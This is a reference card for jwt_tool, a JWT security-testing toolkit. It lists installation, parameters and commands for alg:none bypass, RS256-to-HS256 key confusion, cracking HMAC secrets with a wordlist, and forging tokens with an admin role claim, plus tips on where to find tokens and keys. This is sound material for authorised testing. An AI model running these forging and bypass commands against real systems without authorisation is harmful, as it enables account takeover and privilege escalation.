# jwt_tool

- **Category**: Web / Authentication Testing
- **Risk Level**: 🟡 Medium

---

## Description

A toolkit for testing JSON Web Tokens (JWTs). Analyzes JWT structure and tests for common vulnerabilities: `alg:none` (unsigned token acceptance), algorithm confusion (RS256→HS256), weak HMAC secrets, `kid` SQL/path injection, and JWK/JKU header spoofing. Also supports forging tokens with modified claims after finding a vulnerability. Essential for API and single-page application assessments.

## Installation

```bash
# Pre-installed on Kali (symlinked to /opt/jwt_tool/jwt_tool.py)
jwt_tool -h

# Or install from GitHub:
git clone https://github.com/ticarpi/jwt_tool.git
cd jwt_tool && pip3 install -r requirements.txt
```

## Parameter Reference

| Parameter | Description |
|-----------|-------------|
| `<token>` | JWT token to analyze |
| `-t <url>` | Target URL for automated testing |
| `-rh <header>` | Request header containing JWT (e.g., `Authorization: Bearer <token>`) |
| `-M pb` | Playbook scan — test all common vulnerabilities automatically |
| `-M at` | All Tests mode — run all attack tests against a URL |
| `-X a` | Test alg:none signature-bypass attack |
| `-X s` | Spoof JWKS endpoint |
| `-X k` | Test key confusion / algorithm switching (RS256→HS256) |
| `-X i` | Inject inline JWKS into token header |
| `-C -d <wordlist>` | Crack weak HMAC secret with wordlist |
| `-S hs256 -p <secret>` | Sign/forge token with HMAC secret |
| `-I -pc <claim> -pv <value>` | Inject/modify a payload claim |
| `-T` | Tamper mode — interactive payload editing |
| `-pk <file>` | Public key file (for RS256→HS256 attack) |

## Common Commands

```bash
# Decode and display a JWT
jwt_tool eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...

# Run all vulnerability checks (playbook scan)
jwt_tool -t http://example.com/api/profile -rh "Authorization: Bearer <token>" -M pb

# Test alg:none attack (server accepts unsigned tokens)
jwt_tool <token> -X a

# Test RS256 to HS256 key confusion
jwt_tool <token> -X k -pk public.pem

# Crack weak HMAC secret
jwt_tool <token> -C -d /usr/share/wordlists/rockyou.txt

# Forge a token with modified claims (e.g., escalate role to admin)
jwt_tool <token> -I -pc role -pv admin -S hs256 -p 'secret'

# Interactive tamper mode
jwt_tool <token> -T
```

## Notes & Tips

1. Start with `-M pb` (playbook) to quickly test all common JWT vulnerabilities in one pass.
2. The `alg:none` attack works when the server accepts unsigned tokens — strip the signature and set `alg` to `none`.
3. For RS256→HS256 confusion: obtain the server's public key (often at `/jwks.json` or `/.well-known/jwks.json`), use it as the HMAC secret.
4. Weak secrets are common in dev environments — run cracker against `rockyou.txt` first before advanced attacks.
5. Look for JWT tokens in: `Authorization: Bearer` header, cookies (`token=`, `jwt=`, `session=`), URL parameters, and JSON response bodies.

---

## Official References

- [jwt_tool (GitHub)](https://github.com/ticarpi/jwt_tool)
